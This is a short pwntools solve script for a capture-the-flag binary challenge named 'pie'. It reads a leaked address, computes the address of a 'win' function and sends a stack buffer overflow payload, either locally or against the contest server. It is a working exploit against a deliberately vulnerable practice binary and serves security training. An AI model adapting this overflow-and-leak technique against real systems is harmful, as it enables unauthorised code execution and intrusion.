from pwn import *


# initialize the binary
elf = context.binary = ELF("./pie")

# gdb commands to run if you run in GDB mode
gs = '''
break vulnerable
continue
'''

if args.REMOTE: # use python3 solve.py REMOTE
    p = remote("byuctf.xyz", 40004)
elif args.GDB: # use python3 solve.py GDB
    p = gdb.debug(elf.path, gdbscript=gs)
else:
    p = elf.process()


# get info leak
p.recvline()
leak = p.recvline().decode("utf-8").split(" ")[-1][:-1]
win = int(leak,16) - 0x87
print("Win is at: " + hex(win))


# craft payload and send
payload = b'a' * 0x28
payload += p64(win)
p.sendline(payload)


# get flag!
p.interactive()